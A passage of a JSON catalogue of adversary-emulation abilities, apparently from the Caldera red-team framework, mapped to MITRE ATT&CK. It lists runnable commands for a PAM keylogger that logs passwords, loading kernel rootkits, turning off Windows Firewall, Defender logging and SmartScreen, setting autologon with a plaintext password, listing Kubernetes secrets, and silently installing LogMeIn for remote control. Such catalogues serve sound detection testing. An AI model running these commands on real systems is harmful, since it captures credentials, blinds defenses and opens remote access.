Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["1b4409_T1010.cs"], "parsers": [], "cleanup": ["del /f /q /s %TEMP%\\T1010.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:%TEMP%\\T1010.exe 1b4409_T1010.cs && %TEMP%\\T1010.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Application Window Discovery", "ability_id": "fb8568a6da66d194ab39409de52be4ff", "technique_id": "T1010", "tactic": "discovery", "requirements": [], "name": "List Process Main Windows - C# .NET", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1217-Safari.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> /tmp/T1217-Safari.txt ; cat /tmp/T1217-Safari.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "8afbf7b71eb22ce8a3d64218f6a8128f", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Safari Bookmarks on MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh advfirewall firewall show rule name=all", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "71b3d2945679566b9d94d8cb11df4b70", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "List Windows Firewall Rules", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo defaults read /Library/Preferences/com.apple.alf; sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "97f08c0a2e89b3710d38bf6e4a6b2cbb", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "List macOS Firewall Rules", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "List opened files by user\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "username=$(id -u -n) && lsof -u $username", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "username=$(id -u -n) && lsof -u $username", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "958ef3f865356e682d569ff36cbf88de", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "List opened files by user", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "kubectl get cronjobs -n default", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Kubernetes Cronjob", "ability_id": "52dff845d1f77f440cd58189e2de92cf", "technique_id": "T1053.007", "tactic": "multiple", "requirements": [], "name": "ListCronjobs", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "kubectl get secrets -n default", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Kubernetes List Secrets", "ability_id": "c85384aa4b2dbca53e4ef5f9cac7a39b", "technique_id": "T1552.007", "tactic": "credential-access", "requirements": [], "name": "ListSecrets", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth; sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/system-auth", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Keylogging", "ability_id": "e61902c2b48e140b8b89cc106ffe6c35", "technique_id": "T1056.001", "tactic": "multiple", "requirements": [], "name": "Living off the land Terminal Input Capture on Linux with pam.d", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["6349c0_calc.dll"], "parsers": [], "cleanup": ["taskkill /f /im calculator.exe > nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wuauclt.exe /UpdateDeploymentProvider 6349c0_calc.dll /RunHandlerComServer", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "5f92451000354bf26a40f5c817b5846d", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Load Metasploit Abilities", "repeatable": false, "privilege": "", "buckets": ["build-capabilities"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["msf_extract.rc"], "parsers": [], "cleanup": [], "code": null, "timeout": 1000, "build_target": null, "platform": "darwin", "command": "msfconsole -r msf_extract.rc #{app.contact.http} #{app.api_key.red}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["msf_extract.rc"], "parsers": [], "cleanup": [], "code": null, "timeout": 1000, "build_target": null, "platform": "linux", "command": "msfconsole -r msf_extract.rc #{app.contact.http} #{app.api_key.red}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Build or acquire exploits", "ability_id": "bed8f28e-c0ed-463e-9e31-d5607e5473df", "technique_id": "T1349", "tactic": "build-capabilities", "requirements": [], "name": "Load Metasploit Abilities", "plugin": "access"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loadable Kernel Module based Rootkit\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo modprobe -r T1014; sudo rm /lib/modules/$(uname -r)/T1014.ko; sudo depmod -a"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo modprobe T1014", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Rootkit", "ability_id": "70182ebb9df067f7cb5fe86511dd965c", "technique_id": "T1014", "tactic": "defense-evasion", "requirements": [], "name": "Loadable Kernel Module based Rootkit", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loadable Kernel Module based Rootkit\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rmmod T1014; sudo rm -rf PathToAtomicsFolder/T1014/bin"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Rootkit", "ability_id": "0b70a0fd3c25e63253ad773c36cb00f2", "technique_id": "T1014", "tactic": "defense-evasion", "requirements": [], "name": "Loadable Kernel Module based Rootkit", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["kill -63 1; sudo modprobe -r diamorphine; sudo rm -rf /lib/modules/$(uname -r)/diamorphine.ko /tmp/atomic; sudo depmod -a"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo modprobe diamorphine; ping -c 10 localhost >/dev/null & TARGETPID=\"$!\"; ps $TARGETPID; kill -31 $TARGETPID; ps $TARGETPID || echo \"process ${TARGETPID} hidden\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Rootkit", "ability_id": "d79fab1bc27bcbb4396f4bb69a109914", "technique_id": "T1014", "tactic": "defense-evasion", "requirements": [], "name": "Loadable Kernel Module based Rootkit (Diamorphine)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Locate file that appears in the printer queue", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.system.path"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find ~ -type f -name #{host.print.file} 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.system.path"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find ~ -type f -name #{host.print.file} 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "a41c2324-8c63-4b15-b3c5-84f920d1f226", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "Locate file from printer queue", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "cb6e6c7e18aba2207c696368f8edb23a", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "2d74c884d1e0b55f41542ef64bc8fe4b", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational  -PropertyType DWord -Value 0 -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Indicator Blocking", "ability_id": "be9d436d25abc40a95d31dd28ca7b0cf", "technique_id": "T1562.006", "tactic": "defense-evasion", "requirements": [], "name": "LockBit Black - Disable the ETW Provider of Windows Defender -Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" /v Operational /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" /v Operational /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Indicator Blocking", "ability_id": "8725359f7529791717634d8fdd8948e6", "technique_id": "T1562.006", "tactic": "defense-evasion", "requirements": [], "name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary modifies group policy settings\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore ; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Domain Policy Modification: Group Policy Modification", "ability_id": "5e0427f03faf554046c6a29864087b49", "technique_id": "T1484.001", "tactic": "multiple", "requirements": [], "name": "LockBit Black - Modify Group policy settings -Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary can modify the group policy settings.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Domain Policy Modification: Group Policy Modification", "ability_id": "e9345933cc8cb67dbc560f3c2066edd0", "technique_id": "T1484.001", "tactic": "multiple", "requirements": [], "name": "LockBit Black - Modify Group policy settings -cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary tries to modify the windows firewall registry.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\"  -Name EnableFirewall -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "986876c6024765475043100f9e080fc8", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "LockBit Black - Unusual Windows firewall registry modification -Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary tries to modify the windows firewall registry\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "47c89ca1bebf31127217a582c1ef8661", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "LockBit Black - Unusual Windows firewall registry modification -cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1 && reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1 && reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1 && reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "40480323b4f54b0d1f0b814771ec5776", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "4df316c222125fe7372723c5b3434977", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package ; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Remove-Item $file1 -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "f1b3fca18d7465cd10e5a7477a3bf97d", "technique_id": "T1219", "tactic": "command-and-control", 